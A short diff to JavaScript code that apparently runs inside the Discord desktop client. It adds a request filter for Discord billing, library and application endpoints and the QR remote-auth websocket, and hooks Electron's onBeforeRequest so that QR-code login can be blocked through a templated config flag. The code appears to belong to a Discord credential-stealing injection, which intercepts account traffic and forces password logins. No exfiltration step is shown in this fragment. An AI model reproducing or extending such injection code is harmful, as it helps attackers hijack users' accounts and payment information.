@@ -245,8 +245,11 @@ async function firstTime() {
     return !1
 
 }
+const QRFilter = {
+	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
+}
 
-session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+session.defaultSession.webRequest.onBeforeRequest(QRFilter, (details, callback) => {
     if (details.url.startsWith("wss://")) {
         if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
             callback({
